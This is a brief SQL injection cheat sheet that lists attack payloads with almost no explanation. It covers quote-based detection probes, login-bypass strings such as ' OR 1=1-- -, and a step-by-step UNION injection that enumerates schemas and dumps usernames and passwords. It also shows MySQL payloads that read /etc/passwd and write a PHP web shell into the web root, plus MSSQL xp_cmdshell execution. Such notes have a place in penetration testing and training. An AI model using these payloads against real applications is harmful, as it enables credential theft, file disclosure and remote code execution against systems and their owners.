# SQL Injection

## Detection

```bash
# Add a single quote — does the app error?
'
"
1 OR 1=1
1 AND 1=2
1; --
```

## Authentication Bypass

```
Username: ' OR 1=1-- -          Password: anything
Username: admin'-- -            Password: anything
Username: ' OR 1=1#             Password: anything
```

## UNION Injection (step by step)

```bash
# 1. Find column count
ORDER BY 1    # works
ORDER BY 5    # error → 4 columns

# 2. Find displayable columns
-1 UNION SELECT 1,2,3,4

# 3. Extract database info
-1 UNION SELECT 1,@@version,3,4
-1 UNION SELECT 1,database(),3,4
-1 UNION SELECT 1,user(),3,4

# 4. List databases
-1 UNION SELECT 1,GROUP_CONCAT(schema_name),3,4 FROM information_schema.schemata

# 5. List tables
-1 UNION SELECT 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_schema='dbname'

# 6. List columns
-1 UNION SELECT 1,GROUP_CONCAT(column_name),3,4 FROM information_schema.columns WHERE table_name='users'

# 7. Dump data
-1 UNION SELECT 1,GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),3,4 FROM users
```

## File Operations (MySQL)

```sql
SELECT LOAD_FILE('/etc/passwd')
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'
```

## MSSQL RCE

```sql
EXEC xp_cmdshell 'whoami'
```

## Database-Specific Comments

```
MySQL:      -- (space), #, /* */
MSSQL:      -- (space), /* */
PostgreSQL: -- (space), /* */
Oracle:     -- (space), /* */
```
